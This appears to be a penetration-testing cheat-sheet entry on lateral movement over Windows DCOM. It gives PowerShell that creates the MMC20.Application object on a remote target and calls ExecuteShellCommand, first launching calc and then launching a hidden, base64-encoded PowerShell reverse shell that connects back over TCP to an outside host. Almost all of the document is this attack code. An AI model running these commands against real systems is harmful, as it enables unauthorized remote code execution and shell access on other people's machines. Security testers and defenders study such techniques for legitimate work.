---
title: DCOM
draft: false
tags:
  - windows
  - active-directory
  - recon
  - info-gathering
  - active
---
 
> [!Requirements]
> Administrator privileges on current session.

```powershell
PS C:\> $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","TARGET_IP"))

PS C:\> $dcom.Document.ActiveView.ExecuteShellCommand("COMMAND",DIRECTORY,"PARAMETERS","WINDOWSTATE")

Example:
PS C:\> $dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")

Verify the process is running:
PS C:\> tasklist | findstr "calc"

+ REVERSE SHELL +
*encode the reverse shell in base64 using the WinRM python script or msfvenom*
PS C:\> $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
```
